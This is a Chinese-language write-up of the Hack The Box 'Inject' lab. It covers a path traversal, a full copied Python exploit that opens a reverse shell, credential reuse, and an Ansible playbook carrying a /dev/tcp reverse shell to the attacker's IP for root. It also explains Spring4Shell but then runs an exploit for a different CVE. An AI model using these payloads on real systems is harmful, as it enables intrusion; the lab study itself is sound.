---
title: HTB-Inject Writeup
date: 2026-01-20T19:40:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
---
> 本文章以 kali 地址为 10.10.16.34 做演示

## 初始侦察

### nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --min-rate 10000 -p- 10.129.228.213                       
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 04:39 EST
Nmap scan report for 10.129.228.213
Host is up (0.10s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds
```

开放了两个 TCP 端口 22 和 8080。

### nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap -sT -sC -sV -O -p22,8080 10.129.228.213       
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 04:40 EST
Nmap scan report for 10.129.228.213
Host is up (0.086s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.08 seconds
```


### nmap 漏洞脚本扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --script=vuln -p22,8080 10.129.228.213                                 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 04:40 EST
Nmap scan report for 10.129.228.213
Host is up (0.087s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-enum: 
|   /register/: Potentially interesting folder
|_  /upload/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 591.03 seconds
```

8080 端口可能存在一个 DOS 漏洞，但是在靶机渗透中一般把 DOS 漏洞优先级往后放。

## 文件包含漏洞以及手动枚举

打开 8080 端口。

![](Pasted%20image%2020260120194344.png)

发现右上角有一个可能存在的文件上传地址，打开它。

![](Pasted%20image%2020260120194708.png)

上传一个图片后发现可以查看上传的图片。

![](Pasted%20image%2020260120194734.png)

地址处的 `img=xxx.jpg` 看上去很像有文件包含漏洞，检查一下是否存在。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ curl http://10.129.228.213:8080/show_image?img=../../../../../../../../../etc/passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
```

确实存在漏洞，且有 `bash` 环境的有两个用户 `frank` 与 `phil`。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ curl http://10.129.228.213:8080/show_image?img=../../../../../../../../../etc/passwd | grep 'bash'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1986 100  1986   0     0 11805     0  --:--:-- --:--:-- --:--:-- 11751
root:x:0:0:root:/root:/bin/bash
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

继续枚举 `/var/www` 目录。在 Linux 中，`/var/www` 通常为 Web 服务器的根目录，在手动枚举时要想到查看。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ curl http://10.129.228.213:8080/show_image?img=../../../../../../../../../var/www   
html
WebApp
```

发现 `WebApp` 目录，进一步枚举。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ curl http://10.129.228.213:8080/show_image?img=../../../../../../../../../var/www/WebApp
.classpath
.DS_Store
.idea
.project
.settings
HELP.md
mvnw
mvnw.cmd
pom.xml
src
target
```

对于这种没见过的结构发给 AI 识别。

![](Pasted%20image%2020260120195425.png)

这是一个使用 `Spring Boot` 框架开发的应用程序，继续查看帮助文档。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ curl http://10.129.228.213:8080/show_image?img=../../../../../../../../../var/www/WebApp/HELP.md
# Getting Started

### Reference Documentation
For further reference, please consider the following sections:

* [Official Apache Maven documentation](https://maven.apache.org/guides/index.html)
* [Spring Boot Maven Plugin Reference Guide](https://docs.spring.io/spring-boot/docs/2.6.6/maven-plugin/reference/html/)
* [Create an OCI image](https://docs.spring.io/spring-boot/docs/2.6.6/maven-plugin/reference/html/#build-image)
* [Spring Boot DevTools](https://docs.spring.io/spring-boot/docs/2.6.6/reference/htmlsingle/#using-boot-devtools)
* [Spring Web](https://docs.spring.io/spring-boot/docs/2.6.6/reference/htmlsingle/#boot-features-developing-web-applications)
* [Thymeleaf](https://docs.spring.io/spring-boot/docs/2.6.6/reference/htmlsingle/#boot-features-spring-mvc-template-engines)
* [Spring Data JPA](https://docs.spring.io/spring-boot/docs/2.6.6/reference/htmlsingle/#boot-features-jpa-and-spring-data)

### Guides
The following guides illustrate how to use some features concretely:

* [Building a RESTful Web Service](https://spring.io/guides/gs/rest-service/)
* [Serving Web Content with Spring MVC](https://spring.io/guides/gs/serving-web-content/)
* [Building REST services with Spring](https://spring.io/guides/tutorials/bookmarks/)
* [Handling Form Submission](https://spring.io/guides/gs/handling-form-submission/)
* [Accessing Data with JPA](https://spring.io/guides/gs/accessing-data-jpa/)
```

这个应用程序可能是使用 `spring boot 2.6.6` 编写的，搜索一下 `spring boot 2.6.6` 有没有公开漏洞。

![](Pasted%20image%2020260120195656.png)

可能存在 `CVE-2022-22965` 漏洞。

## 公开漏洞利用与权限提升

### Spring4Shell（CVE-2022-22965）

Spring Framework 是 Java 生态系统中最流行的企业级应用开发框架之一，被全球数百个应用程序使用。而 Spring4Shell 是 Spring Framework 核心模块中一个严重的远程代码执行漏洞，因其影响范围广、利用难度低而被视为 2022 年最重要的安全威胁之一。

Spring4Shell 主要利用了 Java Bean 属性绑定机制和 Tomcat ClassLoader 的特性来实现远程代码执行。漏洞的核心在于 Spring 的数据绑定功能允许攻击者访问本不该暴露的 ClassLoader 属性。

Spring Framework 使用自动数据绑定将 HTTP 请求映射到 Java 对象属性，为了实现灵活的对象操作，Spring 允许通过 `.` 访问嵌套属性。在 JDK 9 及以上版本中，Java 引入了模块系统，每个类都可以通过 `getClass().getMoudule().getClassLoader()` 访问到 ClassLoader。

这时如果在 Spring 应用中编写控制器接受 POJO 参数，攻击者就可以构造特殊的请求参数，如：

```JSP
class.module.classLoader.resources.context.parent.pipeline.first.pattern=恶意代码
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

这串参数链实现了对 Tomcat 访问日志配置的篡改，造成 Spring 在处理绑定数据时可以通过 ClassLoader 接口修改 Tomcat 的日志记录器配置，将恶意 JSP 代码写入 Web 应用的根目录。

使用 [J0ey17/CVE-2022-22963](https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit/blob/main/exploit.py) 漏洞利用。

```python
#!/usr/bin/python3
import requests
import argparse
import socket, sys, time
from threading import Thread
import os
import base64

def nc_listener():
    os.system("nc -lnvp 4444")

def exploit(url,cmd):
    vulnURL = f'{url}/functionRouter'
    payload = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
    body = '.'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
        }
    response = requests.post(url = vulnURL, data = body, headers = headers, verify=False, timeout=5)
    return response

def vuln(code,text):
    resp = '"error":"Internal Server Error"'
    if code == 500 and resp in text:
        print(f'[+] {args.url} is vulnerable\n')
        return True
    else:
        print(f'[-] {args.url} is not vulnerable\n')
        return False

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="URL of the site with spring Framework, example: http://vulnerablesite.com:8080")
    args = parser.parse_args()
    
    if args.url is None:
        parser.print_help()
        sys.exit(1)
    
    print(f"[+] Target {args.url}\n")
    print(f"[+] Checking if {args.url} is vulnerable to CVE-2022-22963...\n")
    response = exploit(args.url,"touch /tmp/pwned")
    v = vuln(response.status_code,response.text)
    if v == True:
        chk = input("[/] Attempt to take a reverse shell? [y/n]")
        if chk == 'y' or chk == 'Y':
            listener_thread = Thread(target=nc_listener)
            listener_thread.start()
            time.sleep(2)
            attacker_ip=input("[$$] Attacker IP:  ")
            command = f"bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1"
            final_command = 'bash -c {echo,' + ((str(base64.b64encode(command.encode('utf-8')))).strip('b')).strip("'") + '}|{base64,-d}|{bash,-i}'
            exploit(args.url,final_command)
    else:
    	exit(0)
```

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ chmod +x exploit.py 

┌──(kali㉿kali)-[~/Work/Kali]
└─$ ls -liah exploit.py 
2781645 -rwxrwxr-x 1 kali kali 2.2K Jan 20 05:21 exploit.py

┌──(kali㉿kali)-[~/Work/Kali]
└─$ python3 exploit.py                                                                    
usage: exploit.py [-h] [-u URL]

options:
  -h, --help     show this help message and exit
  -u, --url URL  URL of the site with spring Framework, example: http://vulnerablesite.com:8080

┌──(kali㉿kali)-[~/Work/Kali]
└─$ python3 exploit.py -u http://10.129.228.213:8080                                      
[+] Target http://10.129.228.213:8080

[+] Checking if http://10.129.228.213:8080 is vulnerable to CVE-2022-22963...

[+] http://10.129.228.213:8080 is vulnerable

[/] Attempt to take a reverse shell? [y/n]y
listening on [any] 4444 ...
[$$] Attacker IP:  10.10.16.34
connect to [10.10.16.34] from (UNKNOWN) [10.129.228.213] 51262
bash: cannot set terminal process group (821): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ whoami
whoami
frank
```

拿到 `frank` 用户的交互环境。在 `frank` 的家目录下发现可能存在有价值信息的目录 `.m2`。

```bash
frank@inject:/$ cd /home/frank
cd /home/frank
frank@inject:~$ ls -liah
ls -liah
total 28K
 95893 drwxr-xr-x 5 frank frank 4.0K Feb  1  2023 .
 95894 drwxr-xr-x 4 root  root  4.0K Feb  1  2023 ..
 95896 lrwxrwxrwx 1 root  root     9 Jan 24  2023 .bash_history -> /dev/null
102295 -rw-r--r-- 1 frank frank 3.7K Apr 18  2022 .bashrc
102096 drwx------ 2 frank frank 4.0K Feb  1  2023 .cache
114493 drwxr-xr-x 3 frank frank 4.0K Feb  1  2023 .local
114498 drwx------ 2 frank frank 4.0K Feb  1  2023 .m2
102093 -rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile
```

读取文件。

```bash
frank@inject:~$ ls -liah .m2
ls -liah .m2
total 12K
114498 drwx------ 2 frank frank 4.0K Feb  1  2023 .
 95893 drwxr-xr-x 5 frank frank 4.0K Feb  1  2023 ..
 95905 -rw-r----- 1 root  frank  617 Jan 31  2023 settings.xml
frank@inject:~$ cat .m2/settin
cat .m2/settings.xml 
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

发现可能为 `phil` 的明文密码 `DocPhillovestoInject123`，尝试登入，拿到 `phil` 的 `bash` 环境。

```bash
frank@inject:~$ su phil
su phil
Password: DocPhillovestoInject123
whoami
phil
```

提升一下交互环境。

```bash
script -qc /bin/bash /dev/null
phil@inject:/home/frank$ whoami
whoami
phil
phil@inject:/home/frank$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:8a:98 brd ff:ff:ff:ff:ff:ff
    inet 10.129.228.213/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 3472sec preferred_lft 3472sec
    inet6 dead:beef::250:56ff:feb9:8a98/64 scope global dynamic mngtmpaddr 
       valid_lft 86396sec preferred_lft 14396sec
    inet6 fe80::250:56ff:feb9:8a98/64 scope link 
       valid_lft forever preferred_lft forever
```

下载 `pspy64` 做进程分析。

```bash
phil@inject:/tmp$ wget http://10.10.16.34/pspy64
wget http://10.10.16.34/pspy64
--2026-01-20 12:45:40--  http://10.10.16.34/pspy64
Connecting to 10.10.16.34:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.96M   245KB/s    in 12s     

2026-01-20 12:45:52 (253 KB/s) - ‘pspy64’ saved [3104768/3104768]

phil@inject:/tmp$ chmod +x pspy64
chmod +x pspy64
phil@inject:/tmp$ ls -liah pspy64
ls -liah pspy64
1281 -rwxrwxr-x 1 phil phil 3.0M Jan 20 11:00 pspy64
phil@inject:/tmp$ ./pspy64
```

等待大约一分钟后收到信息：

![](Pasted%20image%2020260120204819.png)

其中 `2026/01/20 12:48:04 CMD: UID=0     PID=43180  | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml` 令人感兴趣，详细查看该文件。

```bash
phil@inject:/$ cd /opt/automation/tasks
cd /opt/automation/tasks
phil@inject:/opt/automation/tasks$ ls -liah
ls -liah
total 12K
183353 drwxrwxr-x 2 root staff 4.0K Jan 20 12:50 .
183352 drwxr-xr-x 3 root root  4.0K Oct 20  2022 ..
131180 -rw-r--r-- 1 root root   150 Jan 20 12:50 playbook_1.yml
phil@inject:/opt/automation/tasks$ cat 
cat playbook_1.yml 
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

`playbook_1.yml` 是 Ansible Playbook 配置文件，用于自动化管理和配置系统服务，Ansible 是一个广泛使用的 IT 自动化工具，通过 `yaml` 格式的 `playbook` 文件自定义要执行的文件。

- hosts: localhost：指定任务执行的主机为 localhost
- tasks：任务名称
- name：任务描述性名称
- enabled：开机自启动
- state：状态

运行这个 playbook 相当于使用了下面两个命令：

```bash
systemctl enable webapp
systemctl start webapp
```

继续枚举发现 `tasks` 目录可以被 `root` 与 `staff` 组的人修改，而 `phil` 属于 `staff` 组，因此可以自定义一个 `yml` 文件提权。

```bash
phil@inject:/opt/automation$ ls -liah
ls -liah
total 12K
183352 drwxr-xr-x 3 root root  4.0K Oct 20  2022 .
131075 drwxr-xr-x 3 root root  4.0K Oct 20  2022 ..
183353 drwxrwxr-x 2 root staff 4.0K Jan 20 12:58 tasks
phil@inject:/opt/automation$ id    
id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
```

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ vim enil.yml  

┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat enil.yml

- hosts: localhost
  tasks:
    - name: Checking webapp service
      shell: bash -c 'bash -i >& /dev/tcp/10.10.16.34/4444 0>&1'
```

将 `enil.yml` 放入 `staff` 文件夹中，并建立监听等到反弹 shell 运行。

![](Pasted%20image%2020260120210234.png)